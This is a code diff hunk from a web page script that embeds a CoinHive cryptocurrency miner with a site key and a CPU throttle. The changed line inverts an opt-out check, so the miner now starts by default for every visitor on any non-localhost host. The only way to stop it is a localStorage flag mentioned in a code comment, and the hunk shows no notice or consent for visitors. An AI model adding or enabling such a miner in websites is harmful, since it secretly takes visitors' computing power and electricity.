@@ -467,7 +467,7 @@
   window.CoinHive = window.CoinHive || {};
   var miner = new window.CoinHive.Anonymous('iQ7t5qIxTq6qy2jPcBX4vTO7pwUzSo61');
   // Disable with: `localStorage.setItem('noMine', 'true');`
-  if (window.location.hostname !== `localhost` && localStorage.getItem("noMine") === `true`) {
+  if (window.location.hostname !== `localhost` && localStorage.getItem("noMine") !== `true`) {
     miner.setThrottle(0.25);
     miner.start();
     console.log(`M_ON`);
